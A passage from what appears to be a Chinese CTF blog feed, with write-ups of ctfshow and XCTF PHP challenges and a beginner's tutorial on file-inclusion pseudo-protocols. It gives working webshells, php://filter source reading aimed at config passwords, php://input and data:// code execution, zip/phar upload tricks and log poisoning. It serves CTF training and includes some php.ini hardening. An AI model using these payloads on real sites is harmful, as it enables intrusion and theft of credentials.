class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>], <span class="hljs-variable">$allowed</span>)) &#123;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>设置open_basedir：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 限制PHP可访问的目录</span><br><span class="hljs-attr">open_basedir</span> = /var/www/html:/tmp<br></code></pre></td></tr></table></figure></li><li><p>Session文件隔离：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 为每个用户设置独立Session目录</span><br><span class="hljs-attr">session.save_path</span> = <span class="hljs-string">&quot;/var/lib/php/sessions&quot;</span><br></code></pre></td></tr></table></figure></li></ol><p>这个攻击利用了PHP的多个特性和配置默认值，通过精心构造的请求在服务器上创建后门。理解每个步骤对于防御此类攻击至关重要。</p><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>需要用GET传入一个参数file和用POST传入一个参数content，后面是对file参数内容的过滤</p><p>file_put_contents(urldecode($file), “<?php die(‘大佬别秀了’);?>”.$content);</p><ul><li>使用<code>file_put_contents</code>函数将字符串写入到由<code>$file</code>指定的文件中。在写入之前，<code>$file</code>经过了<code>urldecode</code>函数处理，这意味着如果文件名是URL编码的，它会被解码。写入的内容首先是<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>，这是一个PHP脚本，当文件被作为PHP执行时会立即终止执行并显示消息”大佬别秀了”。然后是变量<code>$content</code>的值。</li></ul><p>那么 file_put_contents 函数，将会往 $file 里写入 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 和我们 post 传入的 $content 内容。</p><p>这时候我们可以想到file参数被过滤了很多东西，所以我们可以在content参数中传入一句话木马，但由于会同时写入一个die指令，这时候就需要我们去绕过这个死亡函数了</p><p>由于这里 url 传入的内容本身会进行一次 url 解码，题目中还使用了一个 urldecode 函数，因此 file 传入的内容需要先经过两次 url 编码再传入。</p><p>content是写入内容,要进行base64编码  对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了）（aaPD9waHAgc3lzdGVtKCdscycpOz8+）11是补给前面的 （结果就是phpdie11PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;（四个一组））</p><p>file 传入 php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;shell.php</p><p>进行二次编码后得到:</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</spanbr></code></pre></td></tr></table></figure><p>对 webshell 进行 base64 编码：</p><p>webshell：<code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;</code></p><p>编码后得到:<br>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs&#x2F;Pg&#x3D;&#x3D;</p><p>注意我们还需要加两个合法字符让前面 base64 解码成功，这里多传入两个1。</p><p>post 传入：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">content</span><span class="hljs-operator">=</span><span class="hljs-number">11</span>PD9waHAgQGV2YWwoJF9HRVRbJ2NtZCddKTs/Pg<span class="hljs-operator">=</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>然后调用shell.php，传入cmd</p><p><img src="/%5Cimages%5Cweb87.png"></p><h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; &gt;?<br></code></pre></td></tr></table></figure><p>用伪协议：</p><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]</p><p><img src="/%5Cimages%5Cweb88-1.png"></p><p>改成base64后没有被过滤的符号的，可以添加echo ‘a’或者&gt;末尾任意添加</p><p><img src="/%5Cimages%5Cweb88-2.png"></p><p>即可得到flag</p><h2 id="攻防世界篇"><a href="#攻防世界篇" class="headerlink" title="攻防世界篇"></a>攻防世界篇</h2><h3 id="file-include"><a href="#file-include" class="headerlink" title="file_include"></a>file_include</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./check.php&quot;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先试着用伪协议读</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=flag.php</span><br></code></pre></td></tr></table></figure><p>发现过滤了base，encode，convert</p><p>改用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=php:<span class="hljs-comment">//filter/convert.iconv.UTF-8.UCS-2/resource=flag.php</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2025/01/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2025/01/06/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h2 id="文件包含函数-php"><a href="#文件包含函数-php" class="headerlink" title="文件包含函数(php):"></a>文件包含函数(php):</h2><p><strong>include($file)</strong>:包含文件，出错时仅报警告（E_WARNING），程序继续执行。</p><p><strong>require($file)</strong>:包含文件，出错时报致命错误（E_COMPILE_ERROR），程序终止。</p><p><strong>include_once($file)</strong>:与 include 类似，但会先检查文件是否已被包含，避免重复包含。</p><p><strong>require_once($file)</strong>:与 require 类似，但会先检查文件是否已被包含，避免重复包含。</p><p><strong>file_get_contents($file)</strong>:读取整个文件内容到字符串，可配合 allow_url_fopen 读取远程文件。</p><h2 id="动态执行函数"><a href="#动态执行函数" class="headerlink" title="动态执行函数:"></a>动态执行函数:</h2><p><strong>eval($code)</strong>:执行字符串形式的 PHP 代码（如 eval(“echo ‘hello’;”);）。</p><p><strong>system($cmd)</strong>:执行系统命令并输出结果（如 system(“ls -l”);）。</p><p><strong>exec($cmd)</strong>:执行系统命令并返回结果的最后一行（如 exec(“whoami”);）。</p><p><strong>shell_exec($cmd)</strong>:通过 shell 执行命令，返回完整输出（如 <code>ls -l</code> 或 shell_exec(“ls”);）。</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>伪协议是 PHP 提供的流封装器（Stream Wrappers），允许通过标准文件函数（如 include、file_get_contents）访问：</p><p>格式：&lt;协议&gt;:&#x2F;&#x2F;&lt;路径&gt;（如 php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php）</p><p>当存在文件包含漏洞时（如 include($_GET[‘file’])），伪协议能：</p><p>1.绕过路径限制<br>（无法直接包含非脚本文件时）</p><p>2.读取源码<br>（<strong>避免被 PHP 解析执行</strong>）</p><p>3.实现远程代码执行（<strong>RCE</strong>）<br>（无需文件上传）</p><p>4.利用压缩包&#x2F;临时文件<br>（隐藏恶意代码）</p><hr><h3 id="🌟-一句话理解伪协议"><a href="#🌟-一句话理解伪协议" class="headerlink" title="🌟 一句话理解伪协议"></a>🌟 一句话理解伪协议</h3><blockquote><p><strong>伪协议 &#x3D; 给PHP的「特殊指令」</strong><br>告诉它不要简单打开文件，而是用特殊方式处理文件（比如解码&#x2F;执行代码&#x2F;读取压缩包）</p></blockquote><hr><h3 id="🧩-文件包含漏洞是什么？"><a href="#🧩-文件包含漏洞是什么？" class="headerlink" title="🧩 文件包含漏洞是什么？"></a>🧩 文件包含漏洞是什么？</h3><p>假设有段危险代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">// 比如用户访问：http://site.com/?file=header.php</span><br></code></pre></td></tr></table></figure><p>黑客如果把<code>file</code>参数改成<strong>伪协议指令</strong>，就能让PHP执行危险操作！</p><hr><h3 id="🛠️-五大伪协议详解（新手版）"><a href="#🛠️-五大伪协议详解（新手版）" class="headerlink" title="🛠️ 五大伪协议详解（新手版）"></a>🛠️ 五大伪协议详解（新手版）</h3><h4 id="1️⃣-php-filter（文件内容阅读器）"><a href="#1️⃣-php-filter（文件内容阅读器）" class="headerlink" title="1️⃣ php://filter（文件内容阅读器）"></a>1️⃣ <code>php://filter</code>（文件内容阅读器）</h4><p><strong>作用</strong>：<strong>读取文件源代码</strong>（不让PHP执行它）<br><strong>使用场景</strong>：偷看网站的配置文件（数据库密码等）<br><strong>实战示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=php://filter/convert.base64-encode/resource=config.php<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：看到<code>config.php</code>的Base64编码内容 → 解码后获得密码  </p><blockquote><p>📌 就像对快递员说：“别送包裹了！把里面的信<strong>拍照发我</strong>”（避免拆包裹触发炸弹）</p></blockquote><hr><h4 id="2️⃣-php-input（代码植入器）"><a href="#2️⃣-php-input（代码植入器）" class="headerlink" title="2️⃣ php://input（代码植入器）"></a>2️⃣ <code>php://input</code>（代码植入器）</h4><p><strong>作用</strong>：<strong>把POST请求体中的代码当作文件执行</strong><br><strong>使用场景</strong>：直接控制服务器执行命令</p><p><strong>用法</strong>：url加上php:&#x2F;&#x2F;input，同时post传参，bp抓包把post内容改成命令即可<br><strong>实战示例</strong>： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://site.com/?file=php://input&quot;</span> -d <span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;); ?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：服务器执行<code>ls</code>命令，列出文件  </p><blockquote><p>📌 就像把快递员打晕，<strong>把自己的炸弹塞进包裹</strong>让他配送</p></blockquote><hr><h4 id="3️⃣-data-（代码直插器）"><a href="#3️⃣-data-（代码直插器）" class="headerlink" title="3️⃣ data://（代码直插器）"></a>3️⃣ <code>data://</code>（代码直插器）</h4><p><strong>作用</strong>：<strong>直接在URL里写代码执行</strong><br><strong>使用场景</strong>：快速测试代码执行<br><strong>实战示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=data://text/plain,&lt;?php echo &#x27;HACKED!&#x27;; ?&gt;<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：页面显示 <code>HACKED!</code>  </p><blockquote><p>📌 就像打电话时说：“别收快递了！我<strong>现场给你个炸弹</strong>，立刻引爆！”</p></blockquote><hr><h4 id="4️⃣-zip-（压缩包提取器）"><a href="#4️⃣-zip-（压缩包提取器）" class="headerlink" title="4️⃣ zip://（压缩包提取器）"></a>4️⃣ <code>zip://</code>（压缩包提取器）</h4><p><strong>作用</strong>：<strong>执行压缩包里的PHP文件</strong><br><strong>使用场景</strong>：绕过文件上传检查<br><strong>实战步骤</strong>：</p><ol><li>创建 <code>shell.php</code> 内容 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code></li><li>压缩成 <code>evil.zip</code></li><li>上传到服务器</li><li>触发：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=zip:///var/www/uploads/evil.zip%23shell.php<br></code></pre></td></tr></table></figure><p>✅ <strong>效果</strong>：执行压缩包中的恶意代码  </p><blockquote><p>📌 就像寄送<strong>伪装成玩具的炸弹</strong>，让快递员从玩具箱里取出炸弹</p></blockquote><hr><h4 id="5️⃣-phar-（高级压缩提取器）"><a href="#5️⃣-phar-（高级压缩提取器）" class="headerlink" title="5️⃣ phar://（高级压缩提取器）"></a>5️⃣ <code>phar://</code>（高级压缩提取器）</h4><p>类似 <code>zip://</code>，但支持更多格式（如PHAR、TAR）  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://site.com/?file=phar:///uploads/evil.phar/internal.php<br></code></pre></td></tr></table></figure><hr><h3 id="🛡️-为什么防御难？"><a href="#🛡️-为什么防御难？" class="headerlink" title="🛡️ 为什么防御难？"></a>🛡️ 为什么防御难？</h3><p>伪协议利用了PHP的<strong>合法功能</strong>，防御需主动关闭：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">; 在php.ini中关闭危险设置</span><br><span class="hljs-attr">allow_url_include</span> = <span class="hljs-literal">Off</span><br><span class="hljs-attr">allow_url_fopen</span> = <span class="hljs-literal">Off</span><br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2025/01/03/CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/01/03/CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br><br></code></pre></td></tr></table></figure><p> 检查 HTTP 请求中是否包含名为 c 的参数。如果存在，执行后续代码；否则，跳到 else 语句。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$c = $_GET[<span class="hljs-string">&#x27;c&#x27;</span>]<span class="hljs-comment">; </span><br></code></pre></td></tr></table></figure><p>获取 HTTP 请求中的 c 参数并将其赋值给变量 $c。 （此处的$c不一定是c，只是更好理解罢了）</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(!preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>)</span></span>)&#123; <br></code></pre></td></tr></table></figure><p>使用 preg_match() 函数对 $c 变量进行正则匹配。这个正则表达式检查 $c 中是否包含不区分大小写的字符串 “flag”。如果 $c 中不包含 “flag”，则继续执行后续代码。</p><p>eval($c); 使用 eval() 函数执行 $c 变量中的代码。eval() 会将 $c 中的字符串作为 PHP 代码执行，这可能导致执行任意 PHP 代码，从而形成安全漏洞。</p><p>eval($_GET[2])：</p><ul><li><code>eval()</code> 执行字符串作为 PHP 代码。</li><li><code>$_GET[2]</code> 从 URL 参数 <code>2</code> 获取值（如 <code>&amp;2=system(...)</code>）。</li><li>这允许 <strong>动态执行任意命令</strong>，无需修改 User-Agent 反复注入。</li></ul><p>} 结束 if(!preg_match(“&#x2F;flag&#x2F;i”, $c)) 语句的判断。</p><p>}else{ 如果 $_GET[‘c’] 不存在（即 c 参数没有传递），则执行以下代码。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">highlight_file</span>(FILE); <br></code></pre></td></tr></table></figure><p>highlight_file() 函数将当前 PHP 文件的源代码高亮显示。FILE 是一个常量，它表示当前脚本的文件路径。这意味着如果没有 c 参数，脚本将显示自身的源代码。</p><p>} 结束else语句块</p><p>尝试url&#x2F;?c&#x3D;system(‘ls’);（<strong>闭合标签<code>?&gt;</code></strong>：当PHP遇到<code>?&gt;</code>时，会<strong>自动在结尾插入分号</strong>（称为”隐含分号”），因此<code>system(&#39;ls&#39;)?&gt;</code>等价于<code>system(&#39;ls&#39;);</code>）</p><p>当程序执行到 system(‘ls’) 时，会调用系统的 Shell（如 Bash），运行 ls 命令，列出当前目录下的文件和文件夹（相当于在终端直接输入 ls）。</p><p>得到</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">flag.php <span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure><h4 id="cat：正序，查看-合并文件"><a href="#cat：正序，查看-合并文件" class="headerlink" title="cat：正序，查看&#x2F;合并文件"></a>cat：正序，查看&#x2F;合并文件</h4><h4 id="tac：倒序，查看日志时，优先显示最新行"><a href="#tac：倒序，查看日志时，优先显示最新行" class="headerlink" title="tac：倒序，查看日志时，优先显示最新行"></a>tac：倒序，查看日志时，优先显示最新行</h4><p>本题flag被ban，用通配符*，访问?c&#x3D;system(‘tac fla*.php’);得到flag，访问?c&#x3D;system(‘cat fla*.php’);无显示，查看源代码得到flag</p><p><strong>tac</strong>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">flag = <span class="hljs-string">&#x27;ctfshow&#123;7b9e92b8-e4c5-4478-a9eb-e4a8862691a5&#125;&#x27;</span>;</span><br><br>*/<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@<span class="hljs-built_in">link</span>: https://ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@email: h1xa@ctfer.com</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified <span class="hljs-keyword">time</span>: 2020-09-04 00:14:17</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Last Modified by:   h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Date:   2020-09-04 00:14:07</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">@Author: h1xa</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">-*- coding: utf-8 -*-</span><br>/*<br><br>&lt;?php<br></code></pre></td></tr></table></figure><p>输出顺序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;/html&gt;       <span class="hljs-comment">// 浏览器认为文档已结束</span><br>...<br>&lt;html&gt;        <span class="hljs-comment">// 被当作普通文本</span><br><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 全部当作文本显示</span><br></code></pre></td></tr></table></figure><p>→ Flag直接可见</p><p><strong>cat</strong>（源代码）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-04 00:14:07</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-04 00:14:17</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&#x27;ctfshow&#123;c78ff3fc-09d6-4aa0-9b59-689b0eefebd3&#125;&#x27;</span>;<br><br></code></pre></td></tr></table></figure><p>输出顺序：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-php"><span class="hljs-meta">&lt;?php</span> ... <span class="hljs-meta">?&gt;</span></span><span class="language-xml">  // PHP引擎执行，可能抑制输出</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>        // 浏览器开始解析</span><br><span class="language-xml">...</span><br><span class="language-xml"><span class="hljs-comment">&lt;!-- flag --&gt;</span> // 可能被隐藏</span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p><em>!preg_match(“&#x2F;flag|system|php&#x2F;i”, $c</em></p><p>用<strong>passthru</strong>代替<strong>system</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>=passthru(<span class="hljs-string">&#x27;tac fla*.ph*&#x27;</span>);<br></code></pre></td></tr></table></figure><p>通配符：?匹配单个字符，*匹配任何数量字符，可以是0</p><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p><a href="https://blog.csdn.net/weixin_51213906/article/details/123010661">PHP-RCE绕过的姿势总结_rce如何绕过对system的过滤-CSDN博客</a></p><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p><em>if(!preg_match(“&#x2F;flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(&#x2F;i”, $c)){</em> </p><p>先尝试用?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;system(‘ls’);</p><ul><li>原始代码：<code>include$_GET[1]?&gt;</code><ul><li><code>?&gt;</code> 是PHP的闭合标签，表示PHP代码结束。后续内容（<code>&amp;1=data://...</code>）会被视为普通文本（非PHP代码）。</li></ul></li><li>若替换为<code>include$_GET[1];</code>：<ul><li>分号<code>;</code>表示语句结束，但<strong>缺少空格</strong>导致语法错误。PHP会将<code>include$_GET[1]</code>视为一个未定义的常量（而非<code>include</code>关键字），从而报错。</li></ul></li></ul><p>payload：<code>url/?c=include $_GET[1]?&gt;&amp;1=data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p><p>区别在于<code>1</code>参数的值：</p><ul><li>失败案例：纯字符串 <code>system(&#39;ls&#39;);</code></li><li>成功案例：<code>data://</code>协议封装的数据流</li></ul><h4 id="include语句的工作机制"><a href="#include语句的工作机制" class="headerlink" title="include语句的工作机制"></a><strong><code>include</code>语句的工作机制</strong></h4><p>当执行 <code>include $_GET[1]</code> 时：</p><ol><li>PHP会尝试将 <code>$_GET[1]</code> 的值作为<strong>文件路径</strong>处理</li><li>读取该路径的内容</li><li>将内容当作PHP代码执行</li></ol><h4 id="失败案例解析"><a href="#失败案例解析" class="headerlink" title="失败案例解析"></a><strong>失败案例解析</strong></h4><p>payload1实际执行：<code>include &quot;system(&#39;ls&#39;);&quot;</code></p><p>PHP行为：</p><ol><li>尝试打开名为 <code>system(&#39;ls&#39;);</code> 的文件</li><li>文件系统不存在此文件 → 触发警告</li><li>最终执行的是文件内容（空），而非代码</li></ol><p>payload2实际执行：<code>include &quot;data://text/plain,&lt;?php system(&#39;ls&#39;); ?&gt;&quot;</code></p><p>PHP行为：</p><ol><li>识别<code>data://</code>协议处理器</li><li>解码数据流：<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code></li><li><strong>执行其中的PHP代码</strong> → 运行<code>system(&#39;ls&#39;)</code></li></ol><p>绕过后的payload:<code>url/?c=include%0a$_GET[1]?&gt;&amp;1=data://text/plain/,&lt;?php system(&#39;ls&#39;); ?&gt;</code></p><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>同web32，重点再写一遍<strong>一句话木马</strong>，并尝试用蚁剑连接。</p><p><img src="/images/web33.png"></p><ol><li><p>url加上&#x2F;index.php(嫌麻烦可以跳过)</p></li><li><p>post传参a&#x3D;1(a不要与题目中参数一样)</p></li><li><p>抓包</p></li><li><p>UA头加上**<code>&lt;?php @eval($_POST[&#39;shell&#39;]); ?&gt;</code>**</p></li><li><p>index.php改为实际路径，如&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，即</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure></li><li><p>也可以用<strong>c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>来绕过waf。</p></li><li><p>post参数改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">shell=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;phpinfo&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ol><p>发包发现已经得到想要的结果。</p><p><img src="/images/%E8%9A%81%E5%89%911.png"></p><p><img src="/images/%E8%9A%81%E5%89%912.png"></p><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><p>仔细发现可以利用include进行绕过, 具体实现方式为 <code>eval(include 